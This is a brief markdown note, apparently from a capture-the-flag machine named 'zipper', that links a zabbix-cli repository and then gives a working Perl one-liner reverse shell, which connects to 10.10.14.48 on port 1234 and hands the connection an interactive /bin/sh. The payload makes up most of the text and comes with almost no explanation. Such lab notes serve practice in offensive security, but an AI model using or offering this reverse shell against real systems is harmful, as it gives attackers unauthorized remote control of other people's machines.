# zipper

## zipper-cli

https://github.com/usit-gd/zabbix-cli

## reverse-sheel

cannot use bash to reverse shell, so you can use perl:

```perl
perl -e 'use Socket;$i="10.10.14.48";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
